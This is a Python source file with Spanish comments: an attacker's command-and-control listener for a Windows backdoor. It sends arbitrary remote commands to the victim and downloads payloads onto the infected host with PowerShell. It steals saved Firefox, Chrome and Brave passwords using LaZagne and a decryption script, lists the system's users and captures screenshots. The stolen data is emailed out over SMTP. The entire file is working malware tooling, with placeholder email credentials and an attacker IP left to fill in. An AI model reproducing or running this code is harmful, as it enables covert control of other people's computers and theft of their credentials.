import socket
import signal
from termcolor import colored
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import struct


def signal_handler(sig, frame):
    print(colored("\n[!] Exiting...", "red"))
    exit(1)

signal.signal(signal.SIGINT, signal_handler)



class Listener:
    '''
    Clase para escuchar las conexiones entrantes
    y enviar comandos al cliente o backdoor
    '''
    def __init__(self,ip,port):
        '''
        Inicializa la dirección IP y el puerto
        y crea el socket del servidor
        '''    
        self.ip = ip
        self.port = port
        
        # Crea un socket de tipo TCP/IP
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Por si el socket no se cierra correctamente 
        # para que no se quede el puerto ocupado
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Asocia el socket a la dirección IP y puerto
        self.server_socket.bind((self.ip, self.port))
        
        # Pone el socket en modo de escucha
        self.server_socket.listen()
        
        print("[+] Listening for incoming connections")
        
        # Acepta la conexión entrante 
        # y devuelve el socket del cliente y la dirección del cliente
        self.client_socket, self.client_address = self.server_socket.accept()
        print(f"[+] Connection from {self.client_address}")
        
        
    def send_email(self,subject, body, sender, recipients, password):
        '''
        Función para enviar un email con la información
        del comando ejecutado
        '''
        
        # Crear el mensaje
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)
        
        # Añadir el cuerpo del mensaje
        msg.attach(MIMEText(body, 'plain'))
        
        try:
            # Abrir la imagen y añadirla al mensaje
            with open('capture.png', 'rb') as file:
                img = MIMEImage(file.read(), name='image.png')
            msg.attach(img)
                
            # Enviar el email
            with smtplib.SMTP_SSL('smtp.serviciodecorreo.es', 465) as smtp_server:
                smtp_server.login(sender, password)
                smtp_server.send_message(msg)
        except Exception as e:
             with smtplib.SMTP_SSL('smtp.serviciodecorreo.es', 465) as smtp_server:
                smtp_server.login(sender, password)
                smtp_server.send_message(msg)
            
        print("Email sent Successfully!")
    
    
    
    def run_command(self, command):
        '''
        Ejecuta un comando en el backdoor y devuelve la salida
        '''
        # Envía el comando al cliente o el texto
        self.client_socket.send(command.encode())

        # Recibe la salida del comando ejecutado en el cliente
        # y la devuelve
        return self.client_socket.recv(2048).decode()
    
    
    def get_users(self):
        '''
        Función para obtener los usuarios del sistema
        '''
        
        # Envía el comando al cliente o al backdoor
        # para obtener los usuarios del sistema
        self.client_socket.send(b"net user")

        # Recibe la salida del comando ejecutado en el cliente
        output_command = self.client_socket.recv(2048).decode()
        print(output_command)
        
        self.send_email("List of users", output_command, sender,recipients , password)
    
    
    def send_file(self, file):
        '''
        Función para enviar un archivo al cliente
        haciendo uso de dos comandos
        uno para descargar el archivo en el backdoor y
        otro para moverlo a la carpeta temporal'''
        
        # Formatear la cadena y luego convertirla a bytes para el primer comando
        command1 = f"powershell iwr -uri http://{self.ip}/{file} -o {file}".encode()
        self.client_socket.send(command1)
        self.client_socket.recv(2048)

        # Formatear la cadena y luego convertirla a bytes para el segundo comando
        command2 = f"move {file} c:\\temp".encode()
        self.client_socket.send(command2)
        self.client_socket.recv(2048)
        
        print(f"File {file} sent successfully!")

    
    
    
    def get_firefox(self):
        '''
        Función para obtener las contraseñas de Firefox
        Usando el malware2.py que hace uso de firefox_decrypt.py'''
    
        self.send_file("firefox_decrypt.py")
        self.send_file("malware2.py")
        
        self.client_socket.send(b"python c:\\temp\\malware2.py")
        output_command = self.client_socket.recv(2048).decode()        
        
        print(output_command)
    
            
    def get_chrome(self):
        '''
        Función para obtener las contraseñas de Chrome
        Usando Lazagne y enviando las contraseñas por email
        '''
        self.send_file("lazagne.exe")
        self.client_socket.send(b"c:\\temp\lazagne.exe browsers -chrome")
        output_command = self.client_socket.recv(2048).decode()
        
        print(output_command)
        self.send_email("Chrome pass INFO", output_command, sender,recipients , password)

    
    
    def get_brave(self):
        '''
        Función para obtener las contraseñas de Brave
        Usando Lazagne y enviando las contraseñas por email
        '''
        
        self.send_file("lazagne.exe")
        self.client_socket.send(b"c:\\temp\lazagne.exe browsers -brave")
        
        # Aumentamos los bytes a recibir para que el texto de
        # la salida del comando no se corte.
        output_command = self.client_socket.recv(8192).decode()
        
        print(output_command)
        self.send_email("Brave pass INFO", output_command, sender,recipients , password)



    def screenshot(self):
        '''
        Función para obtener una captura de pantalla
        Enviando un script powershell al cliente que toma la captura
        y la envía al servidor
        '''
        
        self.send_file("screenshot.ps1")
        self.client_socket.send(b"powershell c:\\temp\\screenshot.ps1")
        output_command = self.client_socket.recv(2048).decode()

        print(output_command)

        # Envía el comando al cliente o al backdoor
        self.client_socket.send(b"screenshot")

        # Recibe primero el tamaño del archivo
        file_size_data = self.client_socket.recv(4)
        file_size = struct.unpack("!I", file_size_data)[0]

        # Recibe el archivo capture.png
        with open("capture.png", "wb") as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk = self.client_socket.recv(min(file_size - bytes_received, 16384))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)

        print("Screenshot received successfully!")        
        self.send_email("Screenshot", output_command, sender,recipients , password)

    
    def show_options(self):
        
        # Diccionario con las opciones y descripciones
        # Para el menú de ayuda.
        options = {
            "get users": "Get the list of users and send it by email",
            "get firefox": "Get the firefox passwords and send it by email",
            "get chrome": "Get the chrome passwords and send it by email",
            "get brave": "Get the brave passwords and send it by email",
            "help": "Show this help message"
        }    
        print("\n\nOptions:\n")
        # Muestra las opciones iterando sobre el diccionario
        for option, description in options.items():
            print(f"   {option}:\t{description}")
    
    def run(self):
        '''
        Función para ejecutar el listener
        Y recibir los comandos del atacante
        '''
        while True:
            
            command = input("c2> ")
            
            # Si el comando es "get users" se ejecuta la función get_users
            if command == "get users":
                self.get_users()
            # Si el comando es "get firefox" se ejecuta la función get_firefox
            elif command == "get firefox":
                self.get_firefox()
            elif command == "get chrome":
                self.get_chrome()
            elif command == "get brave":
                self.get_brave()
            elif command == "screenshot":
                self.screenshot()
            # Comnado help para mostrar las opciones
            elif command == "help":
                self.show_options()
            elif command == "exit":
                print(colored("[!] Exiting...", "red"))
                print(colored("[!] Closing the connection...", "red"))
                print(colored("[!] Bye, ciao, adios", "red"))
                self.client_socket.close()
                self.server_socket.close()
                break
            
            else:
                # Ejecuta el comando y recibe la salida
                command_output = self.run_command(command)
                
                print(command_output)
            

if __name__ == "__main__":
    
    
    sender = "youemail@email.com"
    recipients = "[your@email.com]"
    password = "yourpassword"
    ip_server = "192.168.100.51"
    port = 443 # Puerto de escucha del atacante
    
    listener = Listener(ip_server, port)
    listener.run()
   
